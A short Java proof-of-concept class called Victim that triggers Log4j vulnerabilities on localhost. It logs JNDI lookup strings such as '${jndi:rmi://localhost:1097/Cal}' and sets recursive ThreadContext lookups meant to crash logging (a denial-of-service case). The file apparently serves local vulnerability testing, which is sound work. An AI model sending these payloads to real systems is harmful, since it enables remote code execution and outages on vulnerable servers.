package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Victim {

    public static Logger logger = LogManager.getLogger(Victim.class);

    public static void main(String[] args) throws Exception {
        // log4jLookup();
        // lookup();
        dosAttack();

        logger.info("I'm ok");
    }

    static void lookup() throws NamingException {
        new InitialContext().lookup("rmi://localhost:1097/Cal");
    }

    static void log4jLookup() {
        logger.error("${jndi:rmi://localhost:1097/Cal}");
    }

    static void dosAttack() {
        //ThreadContext.put("transaction.id", "${${::-${::-$${::-j}}}}");
        //ThreadContext.put("transaction.id", "${jndi:rmi://localhost:1097/Cal}");
        ThreadContext.put("transaction.id", "${ctx:transaction.id}");
        //logger.info("Malicious log attempt A {}", "${${::-${::-$${::-j}}}}");
        //logger.info("Malicious log attempt B ${${::-${::-$${::-j}}}}");
        logger.info("Malicious log attempt C");
    }
}
